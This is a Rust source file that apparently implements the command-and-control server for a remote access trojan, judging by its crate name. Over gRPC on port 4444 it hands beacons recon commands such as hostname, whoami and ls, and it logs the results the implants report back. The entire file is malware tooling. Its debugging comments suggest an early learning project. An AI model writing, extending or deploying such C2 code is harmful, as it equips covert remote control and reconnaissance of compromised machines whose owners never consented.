use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
use remote_access_trojan::rat::{self, Beacon, Empty, CommandRequest, CommandResponse};
use tonic::{Request, Response, Status};
use tonic::transport::Server;

#[derive(Default)]
pub struct MyAskForInstructions {}

#[derive(Default)]
pub struct MyRecordCommandResult {}

#[tonic::async_trait]
impl AskForInstructions for MyAskForInstructions {
    async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
        println!("Request={request:?}");
        let fake_commands: Vec<&str> = vec!["hostname", "whoami", "ls"];
        let number: usize = request.into_inner().last_received.try_into().unwrap();
        Ok(Response::new(
            CommandRequest {
                command:String::from(fake_commands[number]),
            }
        ))
    }
}

#[tonic::async_trait]
impl RecordCommandResult for MyRecordCommandResult {
    async fn send(&self, request: Request<CommandResponse>) -> Result<Response<Empty>, Status> {
        println!("Request={request:?}");
        Ok(Response::new(
            Empty {}
        ))
    }
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("server");

    // Does the protobuf structure work?
    let example = rat::CommandRequest {
        command:String::from("server words"),
    };
    println!("{example:?}");

    // Can I send a stand up the server?
    let addr = "127.0.0.1:4444".parse()?;

    let instructions_server = MyAskForInstructions::default();
    let recording_server = MyRecordCommandResult::default();
    Server::builder()
        .add_service(AskForInstructionsServer::new(instructions_server))
        .add_service(RecordCommandResultServer::new(recording_server))
        .serve(addr)
        .await?;

    Ok(())
}